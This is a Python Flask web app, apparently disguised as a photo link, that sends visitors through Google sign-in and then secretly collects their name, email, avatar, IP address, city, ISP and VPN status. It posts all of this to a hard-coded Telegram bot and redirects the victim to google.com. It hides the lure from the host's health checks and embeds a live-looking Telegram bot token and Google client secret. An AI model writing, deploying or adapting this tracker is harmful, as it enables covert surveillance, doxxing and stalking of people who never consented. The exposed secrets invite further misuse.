from datetime import datetime
import os
from flask import Flask, redirect, render_template_string, request, session, url_for
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"

GOOGLE_CLIENT_ID = (
    "23197192099-5ik0d5n4cb58leaikc44bernhmq1mgb0.apps.googleusercontent.com"
)
GOOGLE_CLIENT_SECRET = "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"
RENDER_URL = "https://photo-2pii.onrender.com"


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки текста: {e}")


@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent", "")
    if "Go-http-client" in user_agent or "Render" in user_agent:
        return "OK", 200

    redirect_uri = f"{RENDER_URL}/callback"
    google_auth_url = (
        f"https://accounts.google.com/o/oauth2/v2/auth?"
        f"client_id={GOOGLE_CLIENT_ID}&"
        f"redirect_uri={redirect_uri}&"
        f"response_type=code&"
        f"scope=email%20profile"
    )

    return redirect(google_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        print("Ошибка: код авторизации не найден в запросе.")
        return "Ошибка авторизации: код не получен", 400

    redirect_uri = f"{RENDER_URL}/callback"

    token_url = "https://oauth2.googleapis.com/token"
    token_data = {
        "code": code,
        "client_id": GOOGLE_CLIENT_ID,
        "client_secret": GOOGLE_CLIENT_SECRET,
        "redirect_uri": redirect_uri,
        "grant_type": "authorization_code",
    }

    token_r = requests.post(token_url, data=token_data)
    
    # Принудительно выводим в логи Render полный ответ от Google
    print(f"Google Response Status: {token_r.status_code}")
    print(f"Google Response Body: {token_r.text}")

    if token_r.status_code != 200:
        return f"Ошибка получения токена: {token_r.text}", 400

    token_json = token_r.json()
    access_token = token_json.get("access_token")
    if not access_token:
        return f"Ошибка: токен доступа отсутствует в ответе: {token_r.text}", 400

    user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
    headers = {"Authorization": f"Bearer {access_token}"}
    user_r = requests.get(user_info_url, headers=headers)

    if user_r.status_code != 200:
        print(f"User Info Error: {user_r.text}")
        return "Ошибка получения профиля", 400

    user_info = user_r.json()
    email = user_info.get("email", "Не указана")
    name = user_info.get("name", "Не указано")
    picture = user_info.get("picture", "Нет фото")

    ip = request.headers.get(
        "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
    )
    if "," in ip:
        ip = ip.split(",")[0].strip()

    visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    geo_info = {}
    try:
        geo_resp = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy",
            timeout=3,
        )
        if geo_resp.status_code == 200:
            geo_info = geo_resp.json()
    except:
        pass

    country = geo_info.get("country", "Не определено")
    city = geo_info.get("city", "Не определено")
    isp = geo_info.get("isp", "Не определено")
    is_vpn = "Да" if geo_info.get("proxy") else "Нет"

    message_text = (
        f"🔑 *ВХОД ЧЕРЕЗ GOOGLE*\n\n"
        f"👤 *Имя:* `{name}`\n"
        f"📧 *Email:* `{email}`\n"
        f"🖼 *Аватар:* [Фото профиля]({picture})\n\n"
        f"⏱ *Время:* `{visit_time}`\n"
        f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
        f"📍 *Место:* `{country}, {city}`\n"
        f"🏢 *Провайдер:* `{isp}`"
    )

    send_telegram_message(message_text)

    return redirect("https://google.com")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
